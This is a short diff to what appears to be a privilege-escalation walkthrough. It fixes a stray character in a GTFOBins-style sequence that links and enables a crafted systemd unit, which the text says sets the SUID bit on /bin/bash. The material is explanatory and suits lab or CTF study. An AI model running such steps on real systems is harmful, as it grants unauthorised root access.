@@ -79,7 +79,7 @@ Note** You can also set SUID bit of /bin/bash using systemctl GTFObins url. Modi
 > [Install]\
 > WantedBy=multi-user.target' > $TF\
 > /bin/systemctl link $TF\
-> /bin/systemctl enable --now $TF>
+> /bin/systemctl enable --now $TF
 
 After executing the above commands one by one it will set the uid bit of \bin\bash.
 To confirm this thing type the following command.
